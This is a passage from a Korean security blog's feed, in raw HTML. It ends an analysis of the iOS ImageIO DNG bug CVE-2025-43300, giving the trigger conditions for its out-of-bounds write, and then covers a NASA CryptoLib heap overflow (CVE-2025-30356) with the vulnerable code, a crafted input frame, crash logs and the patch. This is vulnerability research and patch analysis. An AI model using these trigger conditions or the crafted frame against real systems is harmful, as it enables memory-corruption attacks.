class="hljs-title">RawRenderer</span>:</span> ObservableObject {    <span class="hljs-keyword">private</span> let context = CIContext(options: [        .cacheIntermediates: <span class="hljs-literal">false</span>    ])    @Published var image: UIImage?    @Published var <span class="hljs-built_in">log</span>: String = <span class="hljs-string">&quot;&quot;</span>    func render(from url: URL) {        <span class="hljs-built_in">log</span> = <span class="hljs-string">&quot;Loading: \(url.lastPathComponent)\n&quot;</span>                guard let raw = CIRAWFilter(imageURL: url, options: [:]) <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;CIRAWFilter unavailable or failed to open URL\n&quot;</span>            <span class="hljs-keyword">return</span>        }          guard let ciImage = raw.value(forKey: kCIOutputImageKey) as? CIImage <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Failed to get CIImage\n&quot;</span>; <span class="hljs-keyword">return</span>        }        let extent = ciImage.extent.integral        guard let cg = context.createCGImage(ciImage, from: extent) <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Failed to create CGImage\n&quot;</span>; <span class="hljs-keyword">return</span>        }        image = UIImage(cgImage: cg)        <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Rendered: \(Int(extent.width))&#xD7;\(Int(extent.height))\n&quot;</span>    }}struct ContentView: View {    @StateObject var renderer = RawRenderer()    @State <span class="hljs-keyword">private</span> var showPicker = <span class="hljs-literal">false</span>    var body: some View {        VStack(spacing: <span class="hljs-number">12</span>) {            <span class="hljs-keyword">if</span> let img = renderer.image {                Image(uiImage: img)                    .resizable()                    .scaledToFit()                    .background(Color.black.opacity(<span class="hljs-number">0.05</span>))                    .cornerRadius(<span class="hljs-number">12</span>)                    .padding(.horizontal)            } <span class="hljs-keyword">else</span> {                Text(<span class="hljs-string">&quot;Open a DNG&quot;</span>).foregroundColor(.secondary)                    .padding(.top, <span class="hljs-number">40</span>)            }            HStack {                Button(<span class="hljs-string">&quot;Open DNG&quot;</span>) { showPicker = <span class="hljs-literal">true</span> }                .buttonStyle(.borderedProminent)                Button(<span class="hljs-string">&quot;Clear&quot;</span>) { renderer.image = nil; renderer.<span class="hljs-built_in">log</span> = <span class="hljs-string">&quot;&quot;</span> }                .buttonStyle(.bordered)            }            ScrollView {                Text(renderer.<span class="hljs-built_in">log</span>)                    .font(.system(.caption, design: .monospaced))                    .frame(maxWidth: .infinity, alignment: .leading)                    .padding()                    .background(Color.black.opacity(<span class="hljs-number">0.03</span>))                    .cornerRadius(<span class="hljs-number">8</span>)            }            .frame(maxHeight: <span class="hljs-number">160</span>)            .padding(.horizontal)        }        .sheet(isPresented: $showPicker) {            DocumentPicker { url in                <span class="hljs-keyword">if</span> let url { renderer.render(from: url) }            }        }    }}struct DocumentPicker: UIViewControllerRepresentable {    var onPick: (URL?) -&gt; Void    func makeCoordinator() -&gt; Coordinator { Coordinator(onPick: onPick) }    func makeUIViewController(context: Context) -&gt; UIDocumentPickerViewController {        <span class="hljs-comment">// DNG UTI&#xB294; &#xC804;&#xD1B5;&#xC801;&#xC73C;&#xB85C; &quot;com.adobe.raw-image&quot;.</span>        <span class="hljs-comment">// iOS 14+&#xC5D0;&#xC120; UTType.image(&#xB610;&#xB294; item)&#xB85C; &#xC5F4;&#xC5B4;&#xB3C4; &#xBB34;&#xBC29;.</span>        let vc = UIDocumentPickerViewController(forOpeningContentTypes: [            UTType(importedAs: <span class="hljs-string">&quot;com.adobe.raw-image&quot;</span>), <span class="hljs-comment">// DNG</span>            .image, .item        ])        vc.allowsMultipleSelection = <span class="hljs-literal">false</span>        vc.delegate = context.coordinator        <span class="hljs-keyword">return</span> vc    }    func updateUIViewController(_ uiViewController: UIDocumentPickerViewController, context: Context) {}    <span class="hljs-keyword">final</span> class Coordinator: NSObject, UIDocumentPickerDelegate {        let onPick: (URL?) -&gt; Void        init(onPick: @escaping (URL?) -&gt; Void) { self.onPick = onPick }        func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {            onPick(urls.first)        }        func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) { onPick(nil) }    }}</code></pre><p><img src="/2025/10/23/clalxk/imageIO_ko/image19.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image21.png" alt="image.png"></p><p><a href="https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346">https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346</a></p><p>&#xC0AC;&#xC6A9;&#xD55C; &#xC774;&#xBBF8;&#xC9C0;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xBDF0;&#xC5B4;&#xB85C; poc dng &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xBA74;&#xC11C; &#xD655;&#xC778;&#xD55C; &#xB0B4;&#xC6A9;&#xB4E4;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>CLosslessJpegUnpacker: <code>0x1DD902E78</code></li><li>CDNGLosslessJpegUnpacker: <code>0x1DD95DE88</code></li><li>CDNGLosslessJpegUnpacker::unpackTile: <code>0x1DD95B198</code></li><li>CLosslessJpegRestartUnpacker: <code>0x1DD95F784</code></li></ul><p><strong>&#xD2B8;&#xB9AC;&#xAC70; &#xC870;&#xAC74;</strong>: SOF3(&#xBB34;&#xC190;&#xC2E4;), DHT &#xC874;&#xC7AC;, SOS &#xC720;&#xD6A8;, <strong>BitsPerSample=16</strong>, <strong>SamplesPerPixel=2</strong>, <strong>NumComponents=1</strong></p><p>&#x2018;&#xD53D;&#xC140; &#xB8E8;&#xD504; &#xC870;&#xAC74;&#x2019;&#xC740; <strong>&#xCEF4;&#xD3EC;&#xB10C;&#xD2B8; &#xAC1C;&#xC218;(1)</strong> &#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC7A1;&#xC544;&#xB193;&#xACE0;, &#xB8E8;&#xD504; &#xB0B4;&#xBD80;&#xC758; &#xC99D;&#xAC00;/&#xC4F0;&#xAE30;&#xB294; <strong>&#xC0D8;&#xD50C; &#xC218;(2)</strong> &#xB97C; &#xAC00;&#xC815;&#xD574; <strong>16&#xBE44;&#xD2B8; &#xD7; 2&#xCC44;&#xB110;</strong>&#xC744; &#xAE30;&#xB85D;&#xD568; &#x2192; &#xD55C; &#xD589;(row)&#xB9C8;&#xB2E4; <strong>&#xC608;&#xC0C1;&#xC758; 2&#xBC30;</strong>&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xC5EC; <strong>OOB Write</strong>&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xB3D9;&#xC791;&#xB4E4;&#xC744; &#xB530;&#xB77C;&#xAC00; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD750;&#xB984;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/23/clalxk/imageIO_ko/image20.png" alt="image.png"></p><ul><li><strong>&#xB9C8;&#xCEE4; &#xD30C;&#xC2F1;</strong>: SOF3(0xFFC0), DHT(0xFFC4), SOS(0xFFDA) &#xD655;&#xC778; &#xBC0F; Huffman &#xD14C;&#xC774;&#xBE14;</li><li><strong>&#xBC84;&#xD37C; &#xACC4;&#xC0B0;/&#xD560;&#xB2F9;</strong>: &#xB300;&#xB7B5; width &#xD7; height &#xD7; SamplesPerPixel(=2) &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD655;&#xBCF4;</li><li><p><strong>1&#xD53D;&#xC140; &#xB514;&#xCF54;&#xB4DC; &#xD6C4; &#xD589; &#xB2E8;&#xC704; &#xB8E8;&#xD504;</strong></p><ul><li>&#xC0AC;&#xC2E4;&#xC0C1; &#x2018;<strong>&#xCEF4;&#xD3EC;&#xB10C;&#xD2B8; &#xC218; &#x2265; 2&#x2019;</strong></li><li><strong>NumComponents=1</strong>, <strong>SamplesPerPixel=2</strong> &#xC870;&#xD569;</li><li><p>&#xB8E8;&#xD504;&#xC758; &#xC885;&#xB8CC; &#xC870;&#xAC74;&#xC740; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;=1&#xC5D0; &#xB9DE;&#xCDB0;&#xC838; &#xC788;&#xC9C0;&#xB9CC;, &#xB0B4;&#xBD80; &#xB3D9;&#xC791;&#xC740; &#xD53D;&#xC140;&#xB9C8;&#xB2E4; 16&#xBE44;&#xD2B8; &#xAC12; &#xB450; &#xAC1C;&#xB97C; &#xC4F0;&#xACE0; &#xD3EC;&#xC778;&#xD130;&#xB97C; 2&#xC0D8;&#xD50C;&#xC529; &#xC774;&#xB3D9;</p><p>&#x2192; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xAC01; &#xD589;&#xC5D0;&#xC11C; <strong>2&#xBC30; &#xCD08;&#xACFC; &#xAE30;&#xB85D;</strong> &#x2192; &#xD589; &#xB05D;&#xC744; &#xB118;&#xC5B4; <strong>OOB Write &#xAC00;&#xB2A5;</strong></p></li></ul></li></ul><p>(<code>0x1DD95B198</code> &#x2192; <code>0x1DD95B6C4</code> &#x2192; <code>0x1DD95B8DC</code> ~ <code>0x1DD95B944</code> &#x2192; <code>0x1DD95BCCC</code>  &#xC774;&#xB807;&#xAC8C; &#xB530;&#xB77C;&#xC11C; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. )</p><h3 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h3><p>&#xC815;&#xB9AC;&#xD558;&#xBA74;, CVE-2025-43300&#xC740; <strong>SamplesPerPixel=2 &#x2194; SOF3 NumComponents=1</strong> &#xBD88;&#xC77C;&#xCE58;&#xB85C; &#xC881;&#xAC8C; &#xC7A1;&#xD78C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; <strong>16bpp&#xD7;2&#xCC44;&#xB110;</strong>&#xC744; &#xD589;&#xB9C8;&#xB2E4; &#xC368; &#xBC84;&#xB824; stride&#xB97C; &#xB118;&#xC5B4;&#xAC00;&#xB294; <strong>OOB Write</strong>&#xAC00; &#xD130;&#xC9C0;&#xB294; &#xBB38;&#xC81C;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; dyld &#xCE90;&#xC2DC; diff&#xC640; vtable &#xD0C0;&#xC785;&#xD654;&#xB97C; &#xD1B5;&#xD574; <strong>CDNGLosslessJpegUnpacker &#x2192; &#xD0C0;&#xC77C; &#xC5B8;&#xD328;&#xCEE4; &#xACBD;&#xB85C;</strong>&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xACE0;, &#xC2E4;&#xC81C; &#xD2B8;&#xB9AC;&#xAC70; &#xC870;&#xAC74; &#xBC0F; &#xD328;&#xD134;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>iOS 18.6.2&#xC5D0;&#xC11C;&#xB294; <strong>CMPhoto+CVPixelBuffer</strong> &#xC804;&#xD658;&#xACFC; <strong>DataSize/stride &#xAC80;&#xC99D;</strong>&#xC744; &#xCD94;&#xAC00;&#xD574; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xB97C; &#xCC28;&#xB2E8;&#xD588;&#xC73C;&#xB2C8;, &#xC2E4;&#xC0AC;&#xC6A9; &#xAE30;&#xAE30;&#xB294; 18.6.2 &#xC774;&#xC0C1; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xAD8C;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;! &#xC800;&#xB3C4; &#xC774;&#xC820;.. &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB824;&#xACE0;&#xC694; &#x314B;&#x314B;.. </p><p>&#xC624;&#xB298; &#xC0B4;&#xD3B4;&#xBCF8; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC2E4;&#xC81C;&#xB85C; &#xC545;&#xC6A9;&#xB418;&#xC5B4; &#xC774;&#xC288;&#xAC00; &#xC788;&#xC5C8;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC5C8;&#xB294;&#xB370;&#xC694;. iOS&#xB97C; &#xCC98;&#xC74C; &#xB514;&#xBC84;&#xAE45;&#xD574;&#xBD10;&#xC11C; &#xB2E4;&#xC18C; &#xC5B4;&#xB824;&#xC6E0;&#xC9C0;&#xB9CC; &#xB098;&#xB984;&#xB300;&#xB85C; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xACFC;&#xC815;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC5D0;&#xB3C4; &#xC5F4;&#xC2EC;&#xD788; &#xACF5;&#xBD80;&#xD574;&#xBCFC;&#xAC8C;&#xC694;~! </p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://github.com/b1n4r1b01/n-days/blob/main/CVE-2025-43300.md">https://github.com/b1n4r1b01/n-days/blob/main/CVE-2025-43300.md</a></p><p><a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html</a></p><p><a href="https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2025-43300">https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2025-43300</a></p><p><a href="https://github.com/msuiche/elegant-bouncer">https://github.com/msuiche/elegant-bouncer</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-43300/">CVE-2025-43300</category>
      
      <category domain="https://hackyboiz.github.io/tags/ImageIO/">ImageIO</category>
      
      <category domain="https://hackyboiz.github.io/tags/MemoryCorruption/">MemoryCorruption</category>
      
      <category domain="https://hackyboiz.github.io/tags/iOS/">iOS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-30356: NASA CryptoLib의 길이 검증 미흡으로 인한 Heap Buffer Overflow</title>
      <link>https://hackyboiz.github.io/2025/10/22/OUYA77/2025-10-22/</link>
      <guid>https://hackyboiz.github.io/2025/10/22/OUYA77/2025-10-22/</guid>
      <pubDate>Wed, 22 Oct 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; NASA SW &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2025/09/10/OUYA77/2025-09-10/&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC9C0;&#xB09C; NASA SW &#xCDE8;&#xC57D;&#xC810;</p><blockquote><p><a href="https://hackyboiz.github.io/2025/09/10/OUYA77/2025-09-10/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2025-54878: NASA CryptoLib&#xC758; Heap Buffer Overflow&#xB85C; &#xC778;&#xD55C; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;(DoS)</a><br><a href="https://hackyboiz.github.io/2025/05/14/OUYA77/2025-05-14/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2024-55030 : NASA fPrime&#xC758; Queue Overflow&#xB85C; &#xC778;&#xD55C; DoS &#xCDE8;&#xC57D;&#xC810;</a><br><a href="https://hackyboiz.github.io/2025/05/01/OUYA77/2025-05-01/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2025-25372: cFS &#xBA54;&#xBAA8;&#xB9AC; &#xAD00;&#xB9AC; &#xBAA8;&#xB4C8;&#xC758; &#xBD80;&#xC801;&#xC808;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC; &#xAC80;&#xC99D;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80; &#xCDE8;&#xC57D;&#xC810;</a><br><a href="https://hackyboiz.github.io/2025/03/29/l0ch/2025-03-29/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2025-30216: CryptoLib&#xC758; Heap Buffer Overflow &#xCDE8;&#xC57D;&#xC810;</a></p></blockquote><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/nasa/CryptoLib/security/advisories/GHSA-6w2x-w7w3-85w2">https://github.com/nasa/CryptoLib/security/advisories/GHSA-6w2x-w7w3-85w2</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NASA CryptoLib &#x2264; 1.3.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="0-&#xCDE8;&#xC57D;&#xC810;-&#xBC30;&#xACBD;"><a href="#0-&#xCDE8;&#xC57D;&#xC810;-&#xBC30;&#xACBD;" class="headerlink" title="0. &#xCDE8;&#xC57D;&#xC810; &#xBC30;&#xACBD;"></a>0. &#xCDE8;&#xC57D;&#xC810; &#xBC30;&#xACBD;</h3><p>NASA CryptoLib&#xC740; cFS(core Flight System)&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC6B0;&#xC8FC;&#xC120;&#xACFC; &#xC9C0;&#xC0C1;&#xAD6D; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xBCF4;&#xD638;&#xD558;&#xAE30; &#xC704;&#xD574; CCSDS(Consultative Committee for Space Data Systems) Space Data Link Security Protocol - Extended Procedures (SDLS-EP)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAE30;&#xBC18; &#xC194;&#xB8E8;&#xC158;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB294; &#xD154;&#xB808;&#xCEE4;&#xB9E8;&#xB4DC; &#xD504;&#xB808;&#xC784; &#xCC98;&#xB9AC; &#xB85C;&#xC9C1;&#xC5D0; Heap Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h3 id="1-Root-Cause-&#xC124;&#xBA85;"><a href="#1-Root-Cause-&#xC124;&#xBA85;" class="headerlink" title="1. Root Cause &#xC124;&#xBA85;"></a>1. Root Cause &#xC124;&#xBA85;</h3><p><code>Crypto_TC_ApplySecurity</code> &#xD568;&#xC218;&#xB294; &#xC554;&#xD638;&#xD654; &#xBC0F; &#xBCF4;&#xC548; &#xAD00;&#xB828; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xBA70;, &#xD1B5;&#xC2E0; &#xD504;&#xB808;&#xC784;&#xC5D0; &#xB300;&#xD55C; &#xBCF4;&#xC548; &#xCC98;&#xB9AC;&#xB97C; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; &#xD504;&#xB808;&#xC784;&#xC758; &#xD5E4;&#xB354;&#xC640; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xAE38;&#xC774;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xACE0;, &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; &#xBD80;&#xBD84;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>Crypto_TC_ApplySecurity_Cam()</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC758; &#xBCF4;&#xC548; &#xAD8C;&#xACE0;&#xC5D0;&#xC11C; <code>fl</code> &#xD544;&#xB4DC;&#xC758; &#xC5B8;&#xB354;&#xD50C;&#xB85C;&#xC6B0; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD588;&#xC9C0;&#xB9CC;, &#xD328;&#xCE58; &#xCF54;&#xB4DC;&#xAC00; &#xBD88;&#xC644;&#xC804;&#xD558;&#xC5EC; &#xC5EC;&#xC804;&#xD788; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xACC4;&#xC0B0;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>&#xBB38;&#xC81C; &#xCF54;&#xB4DC;:</strong></p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (temp_tc_header.fl &lt;= TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + <span class="hljs-number">1</span>){    status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;    mc_if-&gt;mc_log(status);    <span class="hljs-keyword">return</span> status;} <span class="hljs-keyword">uint16_t</span> tf_payload_len = temp_tc_header.fl - TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + <span class="hljs-number">1</span>;<span class="hljs-built_in">memcpy</span>((p_new_enc_frame + index), (p_in_frame + TC_FRAME_HEADER_SIZE + segment_hdr_len), tf_payload_len);</code></pre><p>&#xD604;&#xC7AC;&#xC758; &#xD328;&#xCE58; &#xCF54;&#xB4DC;&#xB294; <code>fl</code>&#xC774; &#xD2B9;&#xC815; &#xC0C1;&#xC218;&#xAC12;&#xBCF4;&#xB2E4; &#xC791;&#xAC70;&#xB098; &#xAC19;&#xC740;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0;&#xB9CC;, &#xC774;&#xB294; <code>tf_payload_len</code> &#xACC4;&#xC0B0;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC5B8;&#xB354;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xC644;&#xC804;&#xD788; &#xB9C9;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xACF5;&#xACA9;&#xC790;&#xAC00; <code>fl</code>&#xC744; <code>6</code>, <code>segment_hdr_len</code>&#xC744; <code>1</code>, <code>fecf_len</code>&#xC744; <code>2</code>&#xB85C; &#xC870;&#xC791;&#xD558;&#xBA74;, <code>tf_payload_len</code> &#xACC4;&#xC0B0; &#xACB0;&#xACFC;&#xB294; <code>-1</code>&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xAC12;&#xC740; <code>uint16_t</code> &#xC790;&#xB8CC;&#xD615;&#xC73C;&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xB418;&#xBA74;&#xC11C; <code>65535</code>&#xC640; &#xAC19;&#xC740; &#xB9E4;&#xC6B0; &#xD070; &#xC591;&#xC218; &#xAC12;&#xC73C;&#xB85C; &#xBCC0;&#xD658;(integer wrap-around)&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, <code>memcpy()</code> &#xD568;&#xC218;&#xB294; <code>tf_payload_len</code>&#xC774; <code>65535</code>&#xB77C;&#xB294; &#xAC70;&#xB300;&#xD55C; &#xAC12;&#xC744; &#xAC16;&#xAC8C; &#xB418;&#xBBC0;&#xB85C;, &#xD560;&#xB2F9;&#xB41C; &#xD799; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xB97C; &#xD6E8;&#xC52C; &#xCD08;&#xACFC;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xD799; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC774; &#xC190;&#xC0C1;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="2-PoC-&#xC124;&#xBA85;"><a href="#2-PoC-&#xC124;&#xBA85;" class="headerlink" title="2. PoC &#xC124;&#xBA85;"></a>2. PoC &#xC124;&#xBA85;</h3><p>ASan(AddressSanitizer)&#xC774; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC870;&#xC791;&#xB41C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xC785;&#xB825; &#xD504;&#xB808;&#xC784;&#xC744; <code>Crypto_TC_ApplySecurity()</code> &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xBA74;, &#xD328;&#xCE58;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; &#xCDA9;&#xB3CC;&#xC744; &#xC720;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC870;&#xC791;&#xB41C; &#xC785;&#xB825; &#xD504;&#xB808;&#xC784;:</p><pre><code class="hljs jsx"><span class="hljs-number">20</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">06</span> <span class="hljs-number">19</span> <span class="hljs-number">31</span> FA <span class="hljs-number">2</span>A <span class="hljs-number">79</span> <span class="hljs-number">20</span> <span class="hljs-number">6</span>F <span class="hljs-number">7</span>F <span class="hljs-number">0</span>D AD <span class="hljs-number">55</span> CE <span class="hljs-number">54</span> <span class="hljs-number">89</span> <span class="hljs-number">9</span>D D3 <span class="hljs-number">7</span>F A6 D0 <span class="hljs-number">07</span> B4 E8 <span class="hljs-number">6</span>D B4 E8 <span class="hljs-number">6</span>D A4 B4 E8 <span class="hljs-number">67</span></code></pre><p>&#xC774; &#xD504;&#xB808;&#xC784;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74;, ASan&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC624;&#xB958;&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xBA70; &#xD799; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript">READ of size <span class="hljs-number">65535</span> at <span class="hljs-number">0</span>x... thread T0#<span class="hljs-number">0</span> <span class="hljs-keyword">in</span> __asan_memcpy#<span class="hljs-number">1</span> <span class="hljs-keyword">in</span> Crypto_TC_ApplySecurity_Cam (crypto_tc.c:<span class="hljs-number">1161</span>)...SUMMARY: AddressSanitizer: heap-buffer-overflow</code></pre><p>&#xB610;&#xD55C;, GDB&#xB85C; &#xC2E4;&#xD589; &#xC2DC; &#xD799; &#xC190;&#xC0C1;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC911;&#xB2E8;(Abort)&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs fortran">----- Crypto_TC_ApplySecurity <span class="hljs-keyword">END</span> -----malloc(): corrupted top <span class="hljs-built_in">size</span><span class="hljs-function"><span class="hljs-keyword">Program</span></span> received signal SIGABRT, Aborted<span class="hljs-number">.</span></code></pre><ul><li><strong>&#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xCEE4;&#xBC0B;:</strong> <code>01b7402cf07c3ee0ddf422de7c20a3d87fff8a87</code></li></ul><h3 id="3-Patch-Diffing"><a href="#3-Patch-Diffing" class="headerlink" title="3. Patch Diffing"></a>3. Patch Diffing</h3><p>Underflow &#xAC80;&#xC0AC;&#xB97C; &#xC704;&#xD574; &#xAE38;&#xC774;&#xAC00; 0&#xBCF4;&#xB2E4; &#xC791;&#xC73C;&#xBA74; &#xD568;&#xC218;&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xB294; &#xAC80;&#xC99D;&#xBB38;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xAC00; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">int16_t payload_calc = temp_tc_header.fl - TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + <span class="hljs-number">1</span>;<span class="hljs-keyword">if</span> (payload_calc &lt; <span class="hljs-number">0</span>){#ifdef TC_DEBUG    printf(<span class="hljs-string">&quot;Payload Calculation Underflow: %d\n&quot;</span>, payload_calc);#endif    status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;    mc_if-&gt;mc_log(status);    